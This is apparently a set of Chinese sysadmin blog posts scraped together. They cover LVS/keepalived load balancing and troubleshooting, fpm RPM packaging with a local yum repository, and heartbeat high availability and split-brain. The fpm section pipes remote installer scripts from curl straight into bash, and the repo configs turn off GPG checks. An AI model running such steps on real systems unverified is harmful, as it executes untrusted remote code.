11\r}\rcheck_isup(){\rnum=`ifconfig eth0:0|grep $VIP|wc -l`\rif [ $num -eq 1 ];then\rreturn 0\rfi\rreturn 12\r}\rwhile true\rdo\rcheck_master\rif [ $? -ne 0 ];then\rcheck_isnode\rif [ $? -eq 0 ];then\rstart\rfi\relse\rcheck_isup\rif [ $? -eq 0 ];then stop\rfi\rfi\rsleep 3\rdone\r常见的LVS负载均衡高可用解决方案 (1) 通过开发上面的脚本来解决，如果负载均衡器硬件坏了。几分钟或秒级别内在其它备机上完成新的部署，如果做的细的，还可以写脚本来做调度器之间的切换和接管功能。早起的方法，还是比较笨重的，目前已经不推荐使用。\n(2) heartbeart+lvs+ldirectord脚本配置方案，这个方案同学们自己可以去搜索，这个方案中heartbeat负责VIP的切换以及资源的启动停止，ldirectord负责RS节点的健康检查，用于比较复杂，不易控制，属于早期的解决方案，现在已经很少使用了。\nheartbeat and ldirectord方案资料:\nhttp://www.linuxvirtualserver.org/docs/ha/heartbeat_ldirectord.html\nhttp://www.linuxvirtualserver.org/docs/ha/ultramonkey.html\n(3) 通过Redhat提供的工具piranha来配置LVS Piranha是REDHAT提供的一个基于Web的LVS配置软件，可以省去手工配置LVS的繁琐工作，同时，也可单独提供。cluster功能，例如，可以通过Piranh。激活Director Server的后备主机，也就是配置Director Server的双机热备功能。\n(4) keepalived+LVS方案，当前最优方案，因为这个方案符合简单、易用、高效的运维原则。 The Keepalived Solution http://www.linuxvirtualserver.org/docs/ha/keepalived\n(5) 其他\nhttp://bbs.linuxtone.org/thread-1402-1-1.html\nLVS Documentation\nhttp://www.linuxvirtualserver.org/zh/index.html\nhttp://www.linuxvirtualserver.org/Documents.html#performance\nhttp://zh.linuxvirtualserver.org/node/2230\nLVS集群分发请求RS不均衡生产环境实战解决 生产环境中 ipvsadm -L -n 发现两台RS的负载不均衡，一台有很多请求，一台没有请求，并且没有请求的那台RS经测试服务正常，lo:VIP也有。但是就是没有请求。\nTCP 172.168.1.50:3307 wrr persistent 10\r一\u0026gt;172.168.1.51:3307 Route 1 0 0\r一\u0026gt;172.168.1.52:3307 Route 1 8 12758\r问题原因：\npersistent 10的原因，persistent会话保持，当clientA访问网站的时候，LVS把请求分发给了52,那么以后clientA再点击的其他操作其他请求，也会发送给52这台机器。\n解决办法:\n到keepalived中注释掉persistent 10然后/etc/init.d/keepalived reload，然后可以看到以后负载均衡两边都请求都均衡了。\n其它导致负载不均的原因可能有：\nLVS自身的会话保持参数设置((-p 300, persistent 300)。优化:大公司尽量用cookie替代session LVS调度算法设置，例如：rr, wrr, wld,lc算法。 后端RS节点的会话保持参数，例如:apache的keealive参数。 访问量较少的情况不均衡的现象更加明显。 用户发送的请求时间长短，和请求资源多少大小。 实现会话保持的方案：\nhttp://oldboy.blog.5lcto.com/2561410/1331316\nhttp://oldboy.blog.51cto.com/2561410/1323468\nLVS故障排错理论及实战讲讲解 排查的大的思路就是，要熟悉LVS的工作原理过程，然后根据原理过程来排查。\n调度器上LVS调度规则及IP的正确性。 RS节点上VIP绑定和arp抑制的检查。 生产处理思路：\n对绑定的vip做实时监控，出问题报警或者自动处理后报警。 把绑定的vip做成配置文件，例如:vi /etc/sysconfig/network-scripts/lo:0 ARP抑制的配置思路：\n如果是单个VIP，那么可以用stop传参设置0。 如果RS端有多个、VIP绑定，此时，即使是停止VIP绑定也一定不要置0。 if [ ${#VIP[@]} ];then\recho \u0026quot;0\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/lo/arp_ignore\recho \u0026quot;0\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/lo/arp_announce\recho \u0026quot;0\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/all/arp_ignore\recho \u0026quot;0\u0026quot; \u0026gt;/proc/sys/net/ipv4/conf/all/arp_announce\rif\rRS节点上自身提供月够的检查(DR不能端口转换)\n辅助排除工具有tcpdump, ping等。\n负载均衡和反向代理集群的三角形排查理论。\nkeepalived+lvs负载均衡配置 virtual_server 10.0.0.10 80 { delay_loop 3 #\u0026lt;== 健康检查时间，单位是秒 lb_algo wrr #\u0026lt;== 负载调度的算法为wlc\rlb_kind DR #\u0026lt;==LVS实现负载的机制，NAT/DR/TUN/FULLNAT nat_mask 255.255.255.0 persistence_timeout 20 #\u0026lt;==会话保持 -p的功能\rprotocol TCP #\u0026lt;==lvs4层负载均衡 tcp udp\r# ipvsadm -A -t 10.0.0.10:80 -s wrr -p 20\rreal_server 192.168.1.5 80 {\rweight 1 #\u0026lt;==配置节点权值，数字越大权重越高 TCP_CHECK { #\u0026lt;==健康检查\rconnect_timeout 10 #\u0026lt;==超时时间\rnb_get_retry 3 #\u0026lt;==延迟重试次数\rdelay_before_retry 3 #\u0026lt;==重试次数\rconnect_port 80 #\u0026lt;==检查端口\r}\r}\r}\r# ipvsadm -a -t 10.0.0.10:80 -r 192.168.1.5 -g -w 1\r查看负载结果\n当master宕机后，可看到近1分钟时间进行切换\nLVS负载均衡代码平滑上线发布思路\n发布代码：\n开发人员本地测试-一\u0026gt;办公室内部测试（开发个人，测试人员）一（配置管理员）\u0026ndash;\u0026gt;IDC机房测试环境（测试人员）\u0026ndash;\u0026gt;正是服务器\u0026ndash;\u0026gt;运维上线\u0026ndash;\u0026gt;100台\n一台一台下，测试完ok挂上去，此时，机器上代码不一致，用户体验就不同，此时需要下线一半，测试，测试完再下线另一半。\n下线方法：\n准备两套配置文件，一套配置文件含有前两台配置文件的配置，一套配置文件含有后两台配置文件的配置。最后用完整的配置文件替换。\n方法二：用ipvsadm来控制节点的增加和删除。keepalived不重启节点就不会改变\n生产场景测试步骤\n","permalink":"https://www.oomkill.com/2017/01/lvs-and-keepalived/","summary":"","title":"LVS \u0026 keepalived 集群架构"},{"content":"rpm与fpm 软件的安装方式 编译安装：优点是可以定制化安装目录、按需开启功能等，缺点是需要查找并实验出适合的编译参数，诸如MySQL之类的软件编译耗时过长 yum安装：优点是全自动化安装，不需要为依赖问题发愁，缺点是自主性太差，软件的功能、存放位置都已经固定好了，不易变更。 编译源码：根据自己的需求做成 RMP包 ==\u0026gt; 搭建yum仓库 ==\u0026gt; yum安装。结合前两者的优点，暂未发现什么缺点。可能的缺点就是RPM包的通用性差，一般人不会定制RPM包。 RPM概述 RPM全称是Red Hat Package Manager(RedHat包管理器)。几乎所有的Linux发型版本都使用这种形式的软件包管理安装、更新和卸载软件。\nrpm命令有5种基本功能（不包括创建软件包）：安装、卸载、升级、查询和验证。\n关于rpm命令的使用可以用rpm \u0026ndash;help来获得\nrpmbuild rpmbuild是reahat系的原声打包命令，这个命令的使用难点主要在于spec文件编写，一个类似于kickstart的ks.cfg文件。\n作为一个使用工具，种种繁琐，在没有替代品时还能存活。当有了其他简易工具时，他就到了完蛋的时候\nfpm fpm 是将一种类型的包转换成另一种类型\n支持的源类型包\n类型 说明 dir 将目录打包成所需要的类型，可以用于源码编译安装的软件包 rpm 对rpm进行转换 gem 对rubygem包进行转换 python 将python模块打包成相对应的类型 支持目标类型包 rpm 转换为rpm包 deb 转换为deb包 solaris 装环卫solaris包 puppet 转换为puppet模块 fpm安装 fpm是ruby写的，因此系统环境需要ruby，而且ruby版本号大于bshards运行的版本。\nyum安装ruby模块 yum install ruby rubygems ruby-devel -y 查看ruby的版本\n$ rpm -qa|grep ruby ruby-libs-1.8.7.374-4.el6_6.x86_64 rubygems-1.3.7-5.el6.noarch ruby-1.8.7.374-4.el6_6.x86_64 ruby-rdoc-1.8.7.374-4.el6_6.x86_64 ruby-devel-1.8.7.374-4.el6_6.x86_64 ruby-irb-1.8.7.374-4.el6_6.x86_64 替换gem源 ruby中国镜像：https://ruby-china.org/\ngem source -a http://gems.ruby-china.org -r remove xx 删除一个gem源列表 -l list gem源列表 安装错误 此问题提示 ruby的版本至少要求为1.9.3，在我们yum安装的ruby为1.8.7\n$ gem install fpm Building native extensions. This could take a while... Building native extensions. This could take a while... ERROR: Error installing fpm: ruby-xz requires Ruby version \u0026gt;= 1.9.3. 解决方法：\n升级ruby版本\n安装低版本fpm\nERROR: Could not find a valid gem 'fpm' (\u0026gt;= 0) in any repository\n原因：gem源失效，替换gem源即可\nERROR: Could not find a valid gem 'fpm' (\u0026gt;= 0) in any repository 升级ruby 下载rvm gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 curl -sSL https://get.rvm.io | bash -s stable # 如果上面的连接失败，可以尝试: curl -L https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer | bash -s stable rvm会下载安装到/usr/local/rvm下\n列出已知的ruby版本 $ /usr/local/rvm/bin/rvm list known # MRI Rubies [ruby-]1.8.6[-p420] [ruby-]1.8.7[-head]$ security released on head [ruby-]1.9.1[-p431] [ruby-]1.9.2[-p330] [ruby-]1.9.3[-p551] ... [ruby-]2.3[.3] [ruby-]2.4[.0] ruby-head ... # IronRuby ironruby[-1.1.3] ironruby-head 按照提示安装ruby1.9.3 /usr/local/rvm/bin/rvm install ruby-1.9.3 将安装的ruby切换为默认 如果想设置为默认版本，这样一来以后新打开的控制台默认的 Ruby 就是这个版本\n错误：RVM is not a function\n$ /usr/local/rvm/bin/rvm use 1.9.3 --default RVM is not a function, selecting rubies with 'rvm use ...' will not work. You need to change your terminal emulator preferences to allow login shell. Sometimes it is required to use `/bin/bash --login` as the command. Please visit https://rvm.io/integration/gnome-terminal/ for an example. 原因：需要添加到系统变量\n[[ -s \u0026quot;$HOME/.rvm/scripts/rvm\u0026quot; ]] \u0026amp;\u0026amp; . \u0026quot;$HOME/.rvm/scripts/rvm\u0026quot; source /etc/profile 安装低版本fpm 指定版本安装\ngem install fpm -v 1.4 查看安装完的fpm版本号\n$ fpm --version 1.4.0 卸载一个安装版本\nrvm remove 1.9.2 https://www.ruby-lang.org/zh_cn/downloads/\n编译安装ruby\n参考资料：\nDownload RubyGems\nruby的升级过程\n如何快速正确的安装 Ruby, Rails 运行环境\nRVM 解决 Ruby 的版本问题 fpm使用 参数 说明 -s 指定源类型 -t 指定目标类型，即想要制作为什么包 -n 指定包的名字 -v 指定包的版本号 -C 指定打包的相对路径 -d 指定依赖于哪些包 -f 第二次包时目录下如果有同名安装包存在，则覆盖它 -p 输出的安装包的目录，不想放在当前目录下就需要指定 \u0026ndash;post-install 软件包安装完成之后所要运行的脚本；同\u0026ndash;offer-install \u0026ndash;pre-install 软件包安装完成之前所要运行的脚本；同\u0026ndash;before-install \u0026ndash;post-uninstall 软件包卸载完成之后所要运行的脚本；同\u0026ndash;offer-remove \u0026ndash;pre-uninstall 软件包卸载完成之前所要运行的脚本；同—before-remove yum安装是如何解决依赖问题的？ 在使用yum安装软件A时，yum会在下载完A的rpm包后，对该rpm包进行检查（rpm包会给出安装该rpm包所依赖的基础库和软件）。如果检查出A的安装还要依赖软件B，那么此时yum就会自动下载并安装B。B安装完毕后，就会继续安装A。如果是内网yum源的话，我们只需要把B放在内网yum源即可。如果检查出A的安装不需要其他软件的支持，那么yum会自动安装A。因此使用rpm -d添加依赖关系\n打包fpm fpm -s dir -t rpm -n sphinx -v 5.5.54 -d 'libaio-devel,ncurses-devel' --post-install /app/mysql.sh /app/mysql 相对路径问题\n使用相对路径打包，会直接保存为/目录。这样就不会是我们指定的目录了。\n$ rpm -pql sphinx-1.0-1.x86_64.rpm /bin/indexer /bin/indextool /bin/searchd ... /var/data/test1stemmed.spp /var/data/test1stemmed.sps /var/log 制定依赖包\nfpm -d 'libaio-devel,ncurses-devel' 在安装时就会检测依赖包，如无此包就报错\n$ rpm -ivh mysql-5.5.54-1.x86_64.rpm error: Failed dependencies: libaio-devel is needed by mysql-5.5.54-1.x86_64 ncurses-devel is needed by mysql-5.5.54-1.x86_64 安装完成后指定要执行的脚本\nfpm --post-install 'mysql.sh' 本地模拟yum安装自己打包的软件\n$ yum localinstall mysql-5.5.54-1.x86_64.rpm 已加载插件：fastestmirror, security 设置本地安装进程 诊断 mysql-5.5.54-1.x86_64.rpm: mysql-5.5.54-1.x86_64 mysql-5.5.54-1.x86_64.rpm 将被安装 .... .... Non-fatal POSTIN scriptlet failure in rpm package mysql-5.5.54-1.x86_64 useradd: user 'mysql' already exists # 安装后执行脚本中创建的用户，因已创建用户，故提示 warning: %post(mysql-5.5.54-1.x86_64) scriptlet failed, exit status 9 已安装: mysql.x86_64 0:5.5.54-1 作为依赖被安装: libaio-devel.x86_64 0:0.3.107-10.el6 ncurses-devel.x86_64 0:5.7-4.20090207.el6 作为依赖被升级: ncurses-base.x86_64 0:5.7-4.20090207.el6 ncurses-libs.x86_64 0:5.7-4.20090207.el6 初始化后启动MySQL并登陆\n$ /etc/init.d/mysqld start Starting MySQL.. SUCCESS! $ bin/mysql Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 1 .. mysql\u0026gt; 打包错误 原因未知\n解决方法：可能是打包时会产生大量的缓存，导致空间不够，删除一些文件后问题再没出现过\n$ fpm -s dir -t rpm -n mysqld -v 5.5.54 -f --post-install /app/m.in.sh --post-uninstall /app/un.m.sh /app/mariadb-5.5.54/ Process failed: rpmbuild failed (exit code 1). Full command was:[\u0026quot;rpmbuild\u0026quot;, \u0026quot;-bb\u0026quot;, \u0026quot;--define\u0026quot;, \u0026quot;buildroot /tmp/package-rpm-build-2570d4ce573d6b34f9153009975231fe511bee89c64018c2c7e219355d61/BUILD\u0026quot;, \u0026quot;--define\u0026quot;, \u0026quot;_topdir /tmp/package-rpm-build-2570d4ce573d6b34f9153009975231fe511bee89c64018c2c7e219355d61\u0026quot;, \u0026quot;--define\u0026quot;, \u0026quot;_sourcedir /tmp/package-rpm-build-2570d4ce573d6b34f9153009975231fe511bee89c64018c2c7e219355d61\u0026quot;, \u0026quot;--define\u0026quot;, \u0026quot;_rpmdir /tmp/package-rpm-build-2570d4ce573d6b34f9153009975231fe511bee89c64018c2c7e219355d61/RPMS\u0026quot;, \u0026quot;--define\u0026quot;, \u0026quot;_tmppath /tmp\u0026quot;, \u0026quot;/tmp/package-rpm-build-2570d4ce573d6b34f9153009975231fe511bee89c64018c2c7e219355d61/SPECS/mysqld.spec\u0026quot;] {:level=\u0026gt;:error} YUM 什么是yum yum主要用于自动安装、升级rpm软件包，他能自动查找并解决rpm包之间的依赖关系。要成功的使用yum工具安装更新软件或系统，就需要有一个包含各种rpm软件包的repository（软件仓库），这个软件仓库我们习惯称为yum源，网络上有大量的yum源，但由于收到网络环境的限制，导致软件安装耗时过长甚至失败。特别是当有大量服务器大量软件包需要安装时，缓慢的进度条令人难以忍受。因此我们在优化系统时，都会更换国内的源。\n相比较而言，本地yum源服务器最大优点是局域网的快速网络连接和稳定性。有了局域网中的yum源服务器，即使在internet连接中断的情况下，也不会影响其他yum客户端的软件安装和升级\n创建yum源 上传rpm包到此目录，此目录下面还可以包括文件夹\nmkdir -p /tools/yum/centos6/x86_64 yum下载的文件缓存在\n/var/cache/yum/x86_64/6/base/ 安装createrepo工具 yum install -y createrepo 初始化repodata索引文件\n$ createrepo -pdo /tools/yum/centos6/x86_64/ /tools/yum/centos6/x86_64/ Spawning worker 0 with 4 pkgs Workers Finished Gathering worker results Saving Primary metadata Saving file lists metadata Saving other metadata Generating sqlite DBs Sqlite DBs complete $ cd /tools/yum/centos6/x86_64/ $ ls libaio-devel-0.3.107-10.el6.i686.rpm libaio-devel-0.3.107-10.el6.x86_64.rpm ncurses-devel-5.7-4.20090207.el6.i686.rpm ncurses-devel-5.7-4.20090207.el6.x86_64.rpm repodata $ ls repodata/. 1453d96f9216e7c230abfe7921a2fd1dd11541568934832306342c89ad04ff1d-other.sqlite.bz2 2475630f1247fc6ac2b822541d6ad71ed83d733792c7d52de580fdebd3abda2c-filelists.sqlite.bz2 9e22eb60f06501a3f4399dc3c2d3e3858567804e7ab352679fa650b93d279fb9-other.xml.gz c3ee9c8d8508c55c77f3f058f056bdd617587ee5a906f22bc9a512bc8b950ded-filelists.xml.gz d9d57f7733cb42831001e915ddd51bb126b67c26bca64bf6c7e7390eed9a54d9-primary.sqlite.bz2 e9616244b93c46350e33dc04d4cb442e49ae375b7400a262bd72e8ba90a1f4a8-primary.xml.gz repomd.xml 提供yum服务 可以用apache或nginx提供web服务，但用Python的http模块更简单，适用于内网环境。CentOS 6最小化安装后自带python。\n利用python的http模块提供服务 python -m SimpleHTTPServer 80 \u0026amp;\u0026gt;/dev/null # 提供服务的目录是执行命令时的目录 利用nginx提供yum源服务 location / { root /tools; index index.html index.htm; autoindex on; # 当找不到首页文件时，会展示目录结构，这个功能一般不要用除非有需求。 # 如没有此选项，会报403 } 添加新的rpm包 # 只下载软件不安装 yumdownlocaler pcre-devel openssl-devel 每当该目录新增软件包需要更新源\ncreaterepo --update /tools 本地客户端配置 /etc/yum.repos.d/test.repo [test] name=Server baseurl=http://192.168.2.110 enable=1 gpgchek=0 使用配置的自定义的源安装PHP\nyum --enablerepo=test --disablerepo=base,extras,updates install php # --enbalerepo使用的源 # --disablerepo禁用源 yum命令 选项 说明 install 安装软件包 yum install httpd list 列出yum仓库内文件 yum list httpd，可搜索带名称的特定软件包 search 不急的软件报的确切名称，可以使用search函数，搜索与指定软件包的名称相匹配的所有可用软件包yum search httpd provides 查找某个特定文件属于哪个软件包。yum provides /app/apache/confi/http.conf grouplist 列出所有可用群组 groupinstall 安装群组软件包yum groupinstall develment-tools repolist 列出启用的软件库 repolist all 列出所有软件库，包括禁用的也列出 \u0026ndash;enablerepo 安装来自特定软件库的软件包 \u0026ndash;disablerepo 不安装来自指定软件库的软件包yum \u0026ndash;enablerepo=test \u0026ndash;disablerepo=base,extras\u0026hellip; install httpd chean all 清理yum缓存内容 history 查看yum历史记录 yum源 Yum源分为三大类：\nBase：就是你下载的光盘镜像里面的DVD1 Extra：就是你下载光盘镜像的DVD2 Epel：属于额外的，得到Epel官方获取 将光盘挂载到系统上，你会发现里面有个packages目录，里面全是rpm包\n$ ls CentOS_BuildTag images ... Packages RPM-GPG-KEY-CentOS-Security-6 $ ll|wc -l 4186 配置yum源 找一个镜像站点，国内常用镜像站点\nhttp://mirrors.aliyun.com\nhttp://mirrors.163.com\n系统yum源路径，执行yum时，它只会读取yum.repo.d下这个目录下的所有以.repo结尾的文件。\n$ ls /etc/yum.repos.d/ CentOS-Base.repo CentOS-fasttrack.repo CentOS-Vault.repo CentOS-Debuginfo.repo CentOS-Media.repo epel.repo repo文件的写入是有其特殊格式的，如下：\n[aaa] name=aaa baseurl=http://192.168.2.110 enable=1 gpgchek=0 [bbb] name=bbb baseurl=http://192.168.2.110 enable=1 gpgchek=0 [ccc] name=ccc baseurl=http://192.168.2.110 enable=1 gpgchek=0 所谓的自己配置Yum仓库就是把网上那些程序包全下载下来，在本地(内网)提供Yum。除了epel提供的所有包外，还有镜像光盘DVD1,DVD2！\nyum服务配置文件 配置文件分为两部分main和repository\n配置本地yum源\n禁用默认的yum网络源，将yum网络源配置文件改名为CentOS-Base.repo.bak，否则会现在网络源中寻找适合的包，改名之后直接从本地源读取。也可以向上面一样自己写一个文件。\n全局配置文件 main部分定义了全局配置选项，整个yum配置文件应该只有一个main，/etc/yum.conf\n# /etc/yum.conf [main] # cachedir：yum缓存的目录，yum在此存储下载的rpm包和数据库，一般是/var/cache/yum/$basearch/$releasever。 cachedir=/var/cache/yum/$basearch/$releasever # 设置 keepcache=1，yum 在成功安装软件包之后保留缓存的头文件 (headers) 和软件包。默认值为 keepcache=0 不保存 keepcache=[1 or 0] # debuglevel：除错级别，0──10,默认是2 貌似只记录安装和删除记录 debuglevel=2 logfile=/var/log/yum.log # pkgpolicy： 包的策略。一共有两个选项，newest和last，这个作用是如果你设置了多个repository，而同一软件在不同的repository中同时存 在，yum应该安装哪一个，如果是newest，则yum会安装最新的那个版本。如果是last，则yum会将服务器id以字母表排序，并选择最后的那个 服务器上的软件安装。一般都是选newest。 pkgpolicy=newest # 指定一个软件包，yum会根据这个包判断你的发行版本，默认是RedHat-release，也可以是安装的任何针对自己发行版的rpm包 distroverpkg=CentOS-release # tolerent，也有1和0两个选项，表示yum是否容忍命令行发生与软件包有关的错误，比如你要安装1,2,3三个包，而其中3此前已经安装了，如果你设为1,则yum不会出现错误信息。默认是0。 tolerant=1 # exactarch，有两个选项1和0,代表是否只升级和你安装软件包cpu体系一致的包，如果设为1，则如你安装了一个i386的rpm，则yum不会用1686的包来升级。 exactarch=1 # retries，网络连接发生错误后的重试次数，如果设为0，则会无限重试。 retries=20 obsoletes=1 # gpgchkeck= 有1和0两个选择，分别代表是否是否进行gpg校验，如果没有这一项，默认是检查的。 gpgcheck=1 # 该选项用户指定 .repo 文件的绝对路径。.repo 文件包含软件仓库的信息 (作用与 /etc/yum.conf 文件中的 [repository] 片段相同)。 reposdir=[包含 .repo 文件的目录的绝对路径] # 默认是 /etc/yum.repos.d/ 低下的 xx.repo后缀文件 # exclude 排除某些软件在升级名单之外，可以用通配符，列表中各个项目要用空格隔开，这个对于安装了诸如美化包，中文补丁的朋友特别有用。 exclude=xxx 第二部分repoitory repoitory部分定义了每个源/服务器的具体配置，可以有一到多个，位于/etc/yum.repos.d/目录下的各文件中。这个字段其实也可以在yum.conf里面直接配置\nrepo文件的格式\n# serverid用于区别各个不同的repository，必须有一个独一无二的名称。 重复了前面覆盖后面--还是反过来呢？？？用enabled 测试是后面覆盖前面 [serverid] # name是对repository的描述，支持像$releasever $basearch这样的变量; name=Fedora Core $releasever - $basearch - Released Updates name=Some name for this server # baseurl是服务器设置中最重要的部分，只有设置正确，才能从上面获取软件。它的格式是： # 其中url支持的协议有 http:// ftp:// file://三种。baseurl后可以跟多个url，你可以自己改为速度比较快的镜像站，但baseurl只能有一个，也就是说不能像如下格式： baseurl=url://server1/path/to/repository/ baseurl=url://server2/path/to/repository/ baseurl=url://server3/path/to/repository/ 其中url指向的目录必须是这个repository header目录的上一级，它也支持$releasever $basearch这样的变量。 baseurl=url://path/to/repository/ baseurl=url://server1/path/to/repository/ url://server2/path/to/repository/ url://server3/path/to/repository/ # 这一行是指定一个镜像服务器的地址列表，通常是开启的，本例中加了注释符号禁用了，我们可以试试，将$releasever和$basearch替换成自己对应的版本和架构，例如10和i386，在浏览器中打开，我们就能看到一长串镜可用的镜像服务器地址列表。 mirrorlist=http://mirrors.fedoraproject.org/mirrorlist?repo=fedora-$releasever\u0026amp;arch=$basearch url之后可以加上多个选项，如gpgcheck、exclude、failovermethod等，比如： # 其中gpgcheck，exclude的含义和[main]部分相同，但只对此服务器起作用 gpgcheck=1 exclude=gaim # failovermethode 有两个选项roundrobin和priority，意思分别是有多个url可供选择时，yum选择的次序，roundrobin是随机选择，如果连接失 败则使用下一个，依次循环，priority则根据url的次序从第一个开始。如果不指明，默认是roundrobin。 failovermethod=priority # 当某个软件仓库被配置成 enabled=0 时，yum 在安装或升级软件包时不会将该仓库做为软件包提供源。使用这个选项，可以启用或禁用软件仓库。 # 通过 yum 的 --enablerepo=[repo_name] 和 --disablerepo=[repo_name] 选项，或者通过 PackageKit 的\u0026quot;添加/删除软件\u0026quot;工具，也能够方便地启用和禁用指定的软件仓库 enabled=[1 or 0] 变量\n$releasever，发行版的版本，从[main]部分的distroverpkg获取，如果没有，则根据redhat-release包进行判断。 $arch，cpu体系，如i686,athlon等 $basearch，cpu的基本体系组，如i686和athlon同属i386，alpha和alphaev6同属alpha。 ","permalink":"https://www.oomkill.com/2016/12/fpm/","summary":"","title":"使用fpm制作rpm包与搭建本地yum源"},{"content":"heartbeat介绍 Heartbeat一款开源提供高可用(Highly-Available)服务的软件，通过heartbeat，可以将资源（IP及程序服务等资源）从一台已经故障的计算机快速转移到另一台正常运转的机器上继续提供服务，一般称之为高可用服务。在实际生产应用场景中，heartbeat的功能和另一个高可用开源软件keepalived有很多相同之处，但在生产中，对应实际的业务应用也是有区别的，例如:keepalived主要是控制IP的漂移，配置、应用简单，而heartbeat则不但可以控制IP漂移，更搜长对资源服务的控制，配置、应用比较复杂\nheartbeat工作原理 通过修改heartbeat软件的配置文件，可以指定哪一台Heartbeat服务器作为主服务器，则另一台将自动成为热备服务器.然后在热备服务器上配里Heartbeat守护程序来监听来自主服务器的心跳消息。如果热备服务器在指定时间内未监听到来自主服务器的心跳，就会启动故障转移程序，并取得主服务器上的相关资源服务的所有权，接替主服务器继续不间断的提供服务，从而达到资源及服务高可用性的目的。\n以上描述的是heartbeat主备的模式，heartbeat还支持主主棋式，即两台服务器互为主备，这时它们之间会相互发送报文来告诉对方自己当前的状态，如果在指定的时间内未受到对方发送的心跳报文，那么，一方就会认为对方失效或者宕机了，这时每个运行正常的主机就会启动自身的资源接管模块来接管运行在对方主机上的资源或者服务，继续为用户提供服务。一般情况下，可以较好的实现一台主机故障后，企业业务仍能够不间断的持续运行。\n注意：所谓的业务不间断，再故障转移期间也是需要切换时间的(例如:停止数据库及存储服务等)，heartbeat的主备高可用的切换时间一般是在5-20秒左右(服务器宕机的切换比人工切换要快)。\n另外，和keepalived高可用软件一样，heartbeat高可用是操作系统级别的，不是服务(软件)级别的，可以通过简单的脚本控制.实现软件级别的高可用。\n高可用服务器切换的常见条件场景：\n主服务器物理宕机(硬件损坏，操作系统故障)。 Heartbeat服务软件本身故障。 两台主备服务器之间心跳连接故障。 服务故障不会导致切换.可以通过服务宕机把heartbeat服务停掉。\n3 heartbeat心跳连接 经过前面的叙述，要部署heartbeat服务，至少需要两台主机来完成。那么，要实现高可用服务，这两台主机之间是如何做到互相通信和互相监侧的呢？\n下面是两台heartbeat主机之间通信的一些常用的可行方法：\n利用串行电缆，即所谓的串口线连接两台服务器(可选)。 一根以太网电缆两网卡直连(可选)。 以太网电缆，通过交换机等网络设备连接(次选)。 如何为高可用服务器端选择心跳通信方案？ 串口线信号不会和以太网网络交集，也不需要单独配置丐地址等信息，因此传输稳定不容易出现问题，使用串口线的缺点是两个服务器对之间的距离距离不能太远，串口线对应服务端的设备为/dev/ttys0。串口线形状如下图所示：\n使用以太网网线(无需特殊交叉线了)直连网卡的方式，配置也比较简单，只需对这两块直连网线的网卡配好独立的IP段地址能够互相通信即可，普通的网线就可以了（推荐）\n使用联网以太网网线和网卡作为心跳线是次选的方案，因为这个链路里增加了交换机设备这样的故障点，且这个线路不是专用心跳线路，容易受以太网其他数据传输的影响，导致心跳报文发送延迟或者无法送达问题。\n选择方案小结：\n和数据相关的业务，要求较高，可以串口和网线直连的方式并用。 Web业务，可以网线直连的方式或局域网通信方式也可。 Heartbeat软件未来发展说明 有关heartbeat分3个分支的说明\n自2.1.4版本后，Linux-HA将Heartbeat分包成三个不同的子项目，并且提供了一个cluster-glue的组件，专用于Local ResourceManager 的管理。即heartbeat + cluster-glue + resouce-agent 三部分。\nHeartbeat hearbeat本身是整个集群的基础（cluster messaging layer），负责维护集群各节点的信息以及它们之前通信。\nCluster Glue 相当于一个中间层，负责调度，可以将heartbeat和crm（pacemaker）联系起来，包括两个摸块:本地资漂管理(Local Resource Manager)LRM和STONITH。\nResource Agents 资源代理层，各种的资源的ocf脚本，这些脚本将被LRM调用从而实现各种资源启动、停止、监控等等。\nPacfrmaker资料\npacemaker介绍：http://baike.baidu.com/view/8635511.htm\n从头开始搭建其群在Fedora上面创建主/主和主/备集群 http://www.clusterlabs.org/doc/zh-CN/Pacemaker/1.1/html-single/Clusters_from_Scratch/index.html\n参考文档：http://www.2cto.com/os/201511/448872.html\n裂脑 什么是裂脑 由于某些原因，导致两台高可用服务器对之间在指定时间内，无法互相检侧到对方心跳而各自启动故障转移功能，取得了资源及服务的所有权，而此时的两台高可用服务器对都还活着并在正常运行，这样就会导致同一个IP或服务在两端同时启动而发生冲突的严重问题，最严重的是两台主机占用同一个VIP地址，当用户写入数据时可能会分别写入到两端，这样可能会导致服务器两端的数据不一致或造成数据丢失，这种情况就被称为裂脑，也有人称其为分区集群或大脑垂直分割，英文为split brain。\n导致裂脑发生的多种原因 一般来说，裂脑的发生，有以下几个原因。 高可用服务器对之间心跳线链路故障。导致无法正常通信。\n心跳线坏了(包括断了，老化)。 网卡及相关驱动坏了，IP配置及冲突问题(网卡直连)。 心跳线间连接的设备故障(网卡及交换机)。 仲裁的机器出问题(仲裁的方案)。 高可用服务器对上开启了如iptables防火墙阻挡了心跳的传输。 高可用服务器对上心跳网卡地址等信息配置不正确，导致发送心跳失败。 其它服务配置不当等原因，如心跳方式不同，心跳广播冲突、软件BUG等。 提示:另外的高可用软件keepalived配置里如果virtual router_id参数，两端配置不一致，也会导致裂脑问题发生。\n防止裂脑发生的8种秘籍 